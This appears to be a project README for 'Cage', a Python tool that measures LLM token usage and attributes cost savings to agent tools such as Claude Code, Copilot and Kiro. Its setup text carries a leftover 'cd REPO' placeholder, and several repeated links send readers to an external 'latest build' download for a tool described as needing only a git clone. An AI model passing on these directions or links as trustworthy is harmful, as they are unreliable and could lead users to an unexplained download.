# Cage - AI Cost Attribution Tool 2026

> **Cage is a Python command-line tool, library, and MCP tool for measuring LLM usage, assigning savings to agent tools, and comparing AI-supported work against human cost baselines.**

[![Platform](https://img.shields.io/badge/Platform-Python%20CLI-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Current-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/mason-wardfr9654/cage-ai-cost-tracker?style=flat-square)](https://github.com/mason-wardfr9654/cage-ai-cost-tracker)

---

<p align="center">
  <a href="https://mason-wardfr9654.github.io/cage-ai-cost-tracker/">
    <img src="https://img.shields.io/badge/Download-Cage%20Latest-brightgreen?style=for-the-badge" alt="Download Cage">
  </a>
</p>

> **[Download Cage](https://mason-wardfr9654.github.io/cage-ai-cost-tracker/)**

---

[Download Latest Build](https://mason-wardfr9654.github.io/cage-ai-cost-tracker/)

---

## What Cage Does

Cage converts AI usage records into an attribution model that shows the contribution of individual tools. Instead of reporting infrastructure spending alone, it measures LLM calls, preserves token activity, and calculates the gross and net savings connected with agent-based work.

Teams can use Cage to evaluate AI workflows by linking usage measurements with tool adoption and completed tasks. Its ledgers and counterfactual analysis distinguish observed results from modeled and estimated values, creating a consistent framework for reviewing costs, savings, and alternative tool choices.

---

## Capabilities

- Capture LLM calls and maintain token-usage data
- Determine gross and net savings for each tool
- Produce deterministic attribution ledgers
- Create counterfactual matrices covering tool combinations
- Mark results as measured, modeled, or estimated
- Monitor adoption across agent tools
- Calculate quality-adjusted cost per successful task
- Provide CLI, Python library, and MCP access
- Connect with Claude Code, Copilot, and Kiro workflows
- Operate on Python 3.11+ with the standard library only

---

## Getting Started

First clone the repository and move into the project directory:

    git clone https://github.com/mason-wardfr9654/cage-ai-cost-tracker.git
    cd REPO

Python 3.11 or later is required. Cage has no third-party runtime dependencies. Start it through the repository's documented CLI entry point, or import its library components into a Python workflow.

When using MCP, register Cage as an MCP server with the client that will use its tools.

---

## Workflow

A standard evaluation with Cage follows these steps:

1. Attach the CLI, Python library, or MCP interface to the agent workflow under review.
2. Measure LLM calls and gather token-usage data.
3. Log the tools involved and the tasks they assist.
4. Create an attribution ledger from the recorded measurements.
5. Examine gross savings, net savings, and quality-adjusted cost per successful task.
6. Use counterfactual analysis to evaluate different tool combinations.
7. Check whether every result is classified as measured, modeled, or estimated.

Cage can additionally analyze adoption across supported agent environments such as Claude Code, Copilot, and Kiro.

---

## Setup and Configuration

Cage relies on Python's standard library, so installing external dependencies is not required. Configuration depends on the interface and integration settings you choose:

- Select the CLI for measurement and reports from a terminal.
- Embed the Python library in an application or analysis pipeline.
- Connect through the MCP interface when working with an MCP-compatible agent workflow.

For reproducible deterministic ledgers and comparisons, keep usage records and attribution inputs consistent between runs.

---

## System Requirements

- Python 3.11 or later
- A compatible Python environment for the CLI or library
- Python standard library only; no external runtime packages
- An LLM or agent workflow with measurable calls and tool activity
- An optional MCP-compatible client for MCP use
- Enough storage for usage records and generated analysis data

---

## Frequently Asked Questions

### What information does Cage track?

Cage records LLM calls and token usage, then connects those measurements to tool-level savings, adoption, and successful task outcomes.

### How does Cage report savings?

Savings are calculated per tool as both gross and net amounts. Attribution and counterfactual analysis can also compare AI-assisted work with a human-cost baseline.

### Can reports show how a value was determined?

Yes. Each figure can be identified as measured, modeled, or estimated, making its basis clear.

### What ways can I use Cage?

The project includes a command-line interface, a Python library, and an MCP interface.

### Does Cage support agent development tools?

Yes. Cage supports Claude Code, Copilot, and Kiro integrations, as well as adoption tracking for agent tools.

### Do I need to install external packages?

No. Cage is designed for Python 3.11+ and uses only the standard library.

### What should I verify when the output seems wrong?

Make sure LLM calls, token usage, tool events, and successful-task outcomes are captured consistently. After that, inspect the attribution ledger and confirm the measured, modeled, or estimated classifications before comparing outputs.

### How can I update Cage?

Pull the latest revision from the Git repository or use the latest build link. Before modifying an established measurement workflow, review the release notes and interface documentation.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
